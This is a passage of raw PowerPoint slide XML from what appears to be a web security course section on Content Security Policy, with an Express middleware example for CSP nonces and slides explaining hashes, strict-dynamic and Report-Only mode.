            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="8723136" cy="4391667"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>app.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>((req, res, next) =&gt; {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1">
                    <a:lumMod val="49000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  // generate per-request nonce</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1">
                  <a:lumMod val="49000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>const</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> nonce = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>crypto.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>randomBytes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2">
                    <a:lumMod val="49000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>16</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>toString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>'base64'</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r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>res.locals.cspNonce</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> = nonce;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>res.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>setHeader</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r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 'Content-Security-Policy'</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endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>     </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> `default-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 'self'`</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r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  `script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 'self' 'nonce-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>${nonce}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>'</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r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>'; '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  );</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> next</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>});</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="169128660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7468C-0DB7-BCB2-C9A3-DDA19EE44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B2974-BCF1-5A06-B0DF-A7D6FA207FBA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Code Example - CSP Nonces 02</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F417C9F-D66B-BEFF-54B0-6F8D7592CE66}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="8723136" cy="4391667"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>Example in VS Code</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="273234724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BDF-E457-F9D1-154A-12FE391B3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34E40-5CEE-CA1F-5EDE-771D7513D39E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP Hashes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{151AAAFB-65EB-9ADC-785B-57B65D08E589}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="8723136" cy="4391667"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>Alternatively, you can use a cryptographic digest (hash) of the script's contents</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>If the inline script’s bytes don’t match the hash in the header, it’s blocked. Hashes use SHA-256/384/512 and must be base64-encoded in the policy.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="113446779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3D14F-4C22-C8D4-4145-0B207B687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618A4-17A3-CCC0-81D0-32E8BBDDA069}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Code Example - CSP Hashes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10CA9C58-E70F-9219-4195-4D60B015F9C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="8723136" cy="4391667"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>Example in VS Code</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="302229329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4B4F-FF3A-FF2C-9D24-F2C967C24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D2DD8-6563-9079-7E4F-951A70A76DAD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP: strict-dynamic</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E928FB99-FFFA-3155-47FD-E22B99BD0FE2}"/>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buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>strict-dynamic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is a keyword you add to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, and its semantics are key:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>If a script has a valid </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>nonce or hash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, then any script </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>it</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> dynamically loads is trusted too, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>and</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> host / scheme allowlists (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>'self'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>https:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, etc.) are ignored for scripts.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos" panose="020B0004020202020204"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6041980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3BB1-56E0-5769-DA25-09DBADBD9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62318-470E-DF15-E26A-D57ECBC8CD9B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP Report-only </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A95B376E-6FDF-40CC-8DDF-EBE17DF41214}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="8723136" cy="4391667"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Content-Security-Policy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (normal) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>blocks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> violations.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Content-Security-Policy-Report-Only</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
